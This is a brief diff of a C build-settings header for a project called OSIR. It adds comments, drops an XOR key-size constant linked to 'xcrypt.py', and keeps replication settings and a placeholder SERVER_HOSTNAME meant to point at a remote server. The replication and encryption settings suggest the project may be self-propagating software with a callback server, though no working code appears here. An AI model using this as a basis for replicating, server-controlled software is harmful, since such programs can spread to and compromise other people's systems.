@@ -1,13 +1,15 @@
 /*
-  Build Settings
+  Build Settings for OSIR
+  
+  *SERVER_HOSTNAME must change
+  to IP of remote server
 */
 #ifndef HEADER_SETTINGS
 	#define HEADER_SETTINGS 1
 	
 	//Replication Settings
 	#define CROSS_PLATFORM_ON 1
-	#define MAX_EXEC_SIZE 99000
-	#define XOR_KEY_SIZE 8 //Do not change without changing xcrypt.py
+	#define MAX_EXEC_SIZE 99000 //bytes
 	
 	//Server IP address
 	#define SERVER_HOSTNAME "127.0.0.1"
